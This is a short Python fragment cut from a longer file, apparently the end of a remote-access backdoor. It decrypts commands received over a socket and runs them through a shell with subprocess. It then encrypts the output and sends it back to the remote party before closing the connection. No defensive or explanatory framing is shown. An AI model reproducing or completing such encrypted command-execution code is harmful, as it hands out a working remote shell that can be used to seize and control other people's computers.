            command = decrypt(data, encryption_key)
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(encrypt(output.decode(), encryption_key).encode())
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()
